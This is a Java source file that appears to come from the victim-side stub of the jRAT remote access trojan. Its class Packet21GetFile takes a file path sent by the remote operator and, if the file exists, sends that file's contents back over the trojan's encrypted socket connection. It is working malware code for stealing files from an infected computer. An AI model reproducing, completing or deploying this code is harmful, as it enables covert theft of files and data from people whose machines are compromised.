package su.jrat.stub.packets.incoming;

import java.io.File;

import su.jrat.common.io.FileIO;
import su.jrat.stub.Connection;
import su.jrat.stub.Main;
import su.jrat.stub.packets.outgoing.Packet29SendFile;


public class Packet21GetFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File file = new File(Connection.readLine());

		if (file.exists() && file.isFile()) {
			Connection.addToSendQueue(new Packet29SendFile(file.getName(), file.getAbsolutePath()));

			FileIO fileio = new FileIO();
			fileio.writeFile(file, Connection.socket, Connection.dos, Connection.dis, null, Main.getKey());

			Connection.lock();
		}
	}

}
